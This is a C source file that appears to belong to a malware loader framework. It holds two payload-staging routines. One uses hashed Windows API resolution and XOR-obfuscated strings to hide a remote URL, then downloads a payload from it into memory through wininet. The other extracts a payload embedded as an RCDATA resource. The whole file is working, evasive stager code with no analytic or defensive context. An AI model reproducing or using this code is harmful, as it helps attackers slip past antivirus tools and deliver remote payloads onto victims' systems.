#include "..\HeaderFiles\Extractor.h"

#ifdef DOWNLOAD
void DownloadPayload(unsigned char** payload, SIZE_T* payload_len_ptr, unsigned char* key, SIZE_T key_len) {
	HMODULE ntdll;
	HMODULE kernel32;
	ntdll = custom_GetModuleHandle(0x7d4a738d);
	kernel32 = custom_GetModuleHandle(0x294e3ff5);

	unsigned char ws2_obfuscated[] = WS2_OBFUSCATED;
	unsigned char wininet_obfuscated[] = WININET_OBFUSCATED;
	unsigned char url[] = URL_OBFUSCATED;

	deobfuscate_xor(ws2_obfuscated, sizeof(ws2_obfuscated), key, key_len);
	deobfuscate_xor(wininet_obfuscated, sizeof(wininet_obfuscated), key, key_len);

	UNICODE_STRING ws2_32_name;
	UNICODE_STRING wininet_name;
	RtlInitUnicodeString_t pRtlInitUnicodeString = (RtlInitUnicodeString_t)custom_GetProcAddress(ntdll, 0x29b75f89);
	pRtlInitUnicodeString(&ws2_32_name, (PCWSTR)ws2_obfuscated);
	pRtlInitUnicodeString(&wininet_name, (PCWSTR)wininet_obfuscated);

	HANDLE ws2_32;
	HANDLE wininet;
	LdrLoadDll_t pLdrLoadDll = (LdrLoadDll_t)custom_GetProcAddress(ntdll, 0x307db23);
	pLdrLoadDll(NULL, 0, &ws2_32_name, &ws2_32);
	pLdrLoadDll(NULL, 0, &wininet_name, &wininet);

	SIZE_T memory_size = PAYLOAD_SIZE;
	RtlAllocateHeap_t pRtlAllocateHeap = (RtlAllocateHeap_t)custom_GetProcAddress(ntdll, 0xc0b381da);
	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
	*payload = (unsigned char*)pRtlAllocateHeap(ProcEnvBlk->ProcessHeap, HEAP_ZERO_MEMORY, memory_size);

	InternetOpenA_t pInternetOpenA = (InternetOpenA_t)custom_GetProcAddress((HMODULE)wininet, 0xf4ad70a1);
	HANDLE hInternet = pInternetOpenA("generic-browser", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	deobfuscate_xor(url, sizeof(url), key, key_len);


	InternetOpenUrlA_t pInternetOpenUrlA = (InternetOpenUrlA_t)custom_GetProcAddress((HMODULE)wininet, 0x8f5ca3b4);
	HANDLE hUrl = pInternetOpenUrlA(hInternet, (LPCSTR)url, NULL, 0, 0, 0);

	int offset = 0;
	DWORD bytesRead = 1;
	InternetReadFile_t pInternetReadFile = (InternetReadFile_t)custom_GetProcAddress((HMODULE)wininet, 0xfb4f8eaa);
	for (; bytesRead > 0;) {
		pInternetReadFile(hUrl, (*payload) + offset, memory_size, &bytesRead);
		offset += bytesRead;
	}
	*payload_len_ptr = offset;

	InternetCloseHandle_t pInternetCloseHandle = (InternetCloseHandle_t)custom_GetProcAddress((HMODULE)wininet, 0x4241bef0);
	pInternetCloseHandle(hUrl);
	pInternetCloseHandle(hInternet);
}
#endif

#ifdef RESOURCE
void ExtractPayload(unsigned char** payload, SIZE_T* payload_len_ptr) {
	HMODULE ntdll;
	HMODULE kernel32;
	HGLOBAL hRes = NULL;
	HRSRC resource = NULL;

	ntdll = custom_GetModuleHandle(0x7d4a738d);
	kernel32 = custom_GetModuleHandle(0x294e3ff5);

	FindResourceA_t pFindResourceA = (FindResourceA_t)custom_GetProcAddress(kernel32, 0x3c704e2f);
	resource = pFindResourceA(NULL, MAKEINTRESOURCE(IDR_RT_RCDATA1), "RT_RCDATA");

	LoadResource_t pLoadResource = (LoadResource_t)custom_GetProcAddress(kernel32, 0xdcde594d);
	hRes = pLoadResource(NULL, resource);

	SizeofResource_t pSizeofResource = (SizeofResource_t)custom_GetProcAddress(kernel32, 0xc17a85d);
	*payload_len_ptr = (SIZE_T)pSizeofResource(NULL, resource);

	LockResource_t pLockResource = (LockResource_t)custom_GetProcAddress(kernel32, 0x145a9296);

	SIZE_T memory_size = PAYLOAD_SIZE;
	RtlAllocateHeap_t pRtlAllocateHeap = (RtlAllocateHeap_t)custom_GetProcAddress(ntdll, 0xc0b381da);
	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
	*payload = (unsigned char*)pRtlAllocateHeap(ProcEnvBlk->ProcessHeap, HEAP_ZERO_MEMORY, memory_size);

	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)custom_GetProcAddress(ntdll, 0x4027607);
	pRtlMoveMemory(*payload, pLockResource(hRes), *payload_len_ptr);
}
#endif